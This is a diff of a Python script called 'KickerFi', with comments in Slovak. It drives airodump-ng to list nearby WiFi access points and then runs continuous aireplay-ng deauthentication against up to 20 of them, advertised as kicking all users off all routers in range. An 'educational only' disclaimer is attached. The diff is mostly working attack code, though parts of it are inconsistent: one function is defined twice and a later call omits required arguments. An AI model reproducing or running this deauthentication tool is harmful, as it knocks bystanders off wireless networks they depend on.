@@ -57,11 +57,15 @@ def CheckSUDO():
     if os.geteuid() !=0:
         print(" ")
         print(" ")
+        print(" " + "+" + " " + "-" * 50 + " " + "+" + " "* 15)
+        print(f"  +{red}                Cannot continue {reset}{orange}!{reset}" + " "* 17 + "+")
         print(" ")
-        print(f"{red}                Cannot continue{reset} {orange}!{reset} \n           Please start it again with {green}sudo{reset}")
+        print(f"    Please start it again using {green}sudo python3 stt.py{reset}")
+        print(" ")
+        print(f"  +{orange}                   Exitting ...{reset}"+ " "*19 +"+")
+        print(" " + "+" + " " + "-" * 50 + " " + "+" + " "* 15)
         print(" ")
         print(" ")
-        print(f"{orange}                    Exitting ...{reset}")
         exit()
     elif os.geteuid() ==1:
         sleep(2)
@@ -91,10 +95,10 @@ def DISCLAIMER():
     print(f"{red}Don't use this script with EVIL INTENT and for abuse !")
     print(f"{green}THIS IS FOR EDUCATIONAL PURPOSES{reset} {orange}ONLY !{reset} (How it works ...)")
     print(" ")
-    print(f"Do You Really want to Start THIS SCRIPT {orange}FOR DISCONNECT ALL USERS{reset} from ALL WiFi Routers around ? ({green}Yes{reset} / {red}No{reset}) :")
+    print(f"Do You Really want to Start THIS SCRIPT {orange}FOR DISCONNECT ALL USERS{reset} from ALL WiFi Routers around ? \n                                         Write ({green}Yes{reset} / {red}No{reset})")
     print(" ")
     print(" ")
-    dis = input("  --> ")
+    dis = input("                                      --> ")
     if dis == "Yes" or dis =="yes":
         sleep(1)
         print("Ok, Continuining")
@@ -217,25 +221,76 @@ print(" ")
 print(" ")
 print(" ")
 Interface = input(f"Select WiFi interface ({green}wlan0{reset} or {green}wlan1{reset}) for Scanning: ")
-print(f"{green}Starting on {reset}", Interface)
+print(f"{green}Starting on{reset}", Interface)
 sleep(1)
 print(" ")
 print(" ")
 print(" ")
+
+#def AirEplayNg():
+#    subprocess.call(["sudo", "aireplay-ng", "--deauth", "0" ,Interface])
+
+def AirodumpNg():
+    os.system("clear")
+    sleep(1)
+    print(f"{yellow}Starting{reset} airodump-ng on {Interface} WIFi Adapter")
+    sleep(1)
+    # Spusti airodump-ng na odchytávanie zariadení v dosahu
+    subprocess.Popen(["airodump-ng", "-w", "output", "--output-format", "csv", Interface])
+
+    # Počkaj nejakú chvíľu na získanie dostatočného počtu zariadení
+    sleep(10)
+
+    # Zastav airodump-ng
+    subprocess.run(["pkill", "airodump-ng"])
+    sleep(2)
+
+    # Získaj zoznam BSSID a ESSID z výstupného súboru airodump-ng
+    devices = get_devices_from_output("output-01.csv")
+
+    if len(devices) < 1:
+        print("No devices found in range.")
+        exit()
+
+    # Odpoj zvolený počet zariadení s použitím BSSID a ESSID
+    num_devices = 20  # Zadajte počet zariadení, ktoré chcete odpojiť
+    if num_devices > len(devices):
+        num_devices = len(devices)
+
+    for i in range(num_devices):
+        bssid = devices[i]["bssid"]
+        essid = devices[i]["essid"]
+        AirEplayNg(bssid, essid)
+        sleep(1)
+
+def AirEplayNg(bssid, essid):
+    subprocess.call(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "-e", essid])
+
+def get_devices_from_output(output_file):
+    devices = []
+    with open(output_file, "r") as file:
+        lines = file.readlines()
+        for line in lines[4:]:
+            values = line.strip().split(",")
+            bssid = values[0].strip()
+            essid = values[13].strip().strip('"')
+            devices.append({"bssid": bssid, "essid": essid})
+    return devices
+
+ 
 
 def AirodumpNg():
     os.system("clear")
     sleep(1)
     print(f"{yellow}Starting{reset} airodump-ng on", Interface,"WIFi Adapter")
     sleep(1)
-    SubProc = subprocess.Popen(["airodump-ng ", Interface])
+    #SubProc = subprocess.Popen(["airodump-ng", Interface])
+    SubProc = subprocess.Popen(["airodump-ng", Interface], shell=False)
     sleep(28)
     SubProc.terminate()
-
-def AirEplayNg():
-    subprocess.call(["sudo", "aireplay-ng", "--deauth", "0" ,Interface])
-
-AirEplayNg()
+    sleep(3)
+    AirEplayNg()
+#AirEplayNg()
 
 def AirCrackNg():
     os.system("clear")
@@ -251,9 +306,9 @@ def Start_KickerFi():
         MonMODE_wlan1()
         print(" ")
         print(" ")
-        print(f"[ 1 ] {green}START AiroDump-ng on{reset}",Interface)
+        print(f"[ 1 ] {green}START AiroDump-ng on{reset}",Interface, "(And after 28 Seconds deauth)")
         print(f"[ 2 ] {orange}STOP{reset} {orange}MONITOR MODE{reset} on" ,Interface)
-        print(f"[ 3 ] ")
+        print(f"[ 3 ] neni nastavene")
         print(f"[ 4 ] {red}EXIT{reset}")
         c = input("Option : ")
         if c =="1":
@@ -261,15 +316,16 @@ def Start_KickerFi():
             os.system("clear")
             print("Ahoj :D")
             AirodumpNg()
+            AirEplayNg()
         elif c =="2":
             os.system("clear")    
             sleep(1)
-            os.system("sudo airmon-ng stop",Interface)
+            subprocess.run(["sudo", "airmon-ng", "stop", Interface])
             sleep(3)
             os.system("sudo service NetworkManager restart")
             sleep(3)
             os.system("clear")
-            print(f"{orange}MONITOR MODE{reset} {green}Sucessfully DISABLED on{reset}on",Interface)
+            print(f"{orange}MONITOR MODE{reset} {green}Sucessfully DISABLED on{reset} ", Interface)
             print("\n")
             sleep(2)
         
@@ -287,30 +343,6 @@ def Start_KickerFi():
         exitting()
     print("")
     print("")
-
-
-def SetupKickerFi():
-    os.system("clear")
-    print("Write WiFi adapter For save")
-    print(f"[ 1 ] wlan{green}0{reset}")
-    print(f"[ 2 ] wlan{green}1{reset}")
-    AdapterChoice = input("Pick : ")
-    with open("Adapters.txt","w") as file:
-        file.write(AdapterChoice)
-    
-    # TO DO
-print("Which WiFi Adapter you want to save for next use ?\n[ 1 ] wlan0\n[ 2 ] wlan1\n")
-SaveAndForNexUse = input("  Select --> ")
-
-output = " "
-
-if SaveOutput =="1":
-    output += print("wlan0")
-
-elif SaveOutput =="2":
-    output += print("wlan1")
-
-SaveOutput(output)
 
 os.system("clear")
 sleep(0.2)
@@ -333,17 +365,29 @@ WiFiLOGO()
 print(" ")
 print(f"{green}[ 1 ]{reset} {green}START KickerFi{reset} {orange}KICK ALL DEVICES{reset} on {P}ALL{reset} WiFi Routers ({P}Distance{reset} : 6 - 20 meters)")
 print(f"{magenta}[ 2 ]{reset} {green}SETUP KickerFi{reset} ({red}NEED TO SET{reset} {orange}!{reset})")
+print(f"{magenta}[ 3 ]{reset} Stop Monitor Mode on", Interface)
 print(" ")
-print(f"{orange}[ 3 ]{reset} {orange}EXIT{reset}")
+print(f"{orange}[ 4 ]{reset} {orange}EXIT{reset}")
 
 b = input("\nOption : ")
 if b =="1":
     Start_KickerFi()
+
 elif b =="2":
-    SetupKickerFi()
-elif b =="3":
+    #SetupKickerFi()
+    print("Setting nejsu nastavene ESTE ...")
+elif b == "3":
+    subprocess.Popen(["sudo", "airmon-ng", "stop", Interface])
+    sleep(3)
+    subprocess.run(["sudo", "service", "NetworkManager", "restart"])
+    # os.system("clear")
+    sleep(1)
+    print(f"{orange}\nMonitor Mode {reset}{green}Successfully{reset} Disabled\n")
+
+elif b =="4":
     print("Exitting ...")
     exitting()
+
 else:
     print("Invalid INPUT !")
     sleep(2)
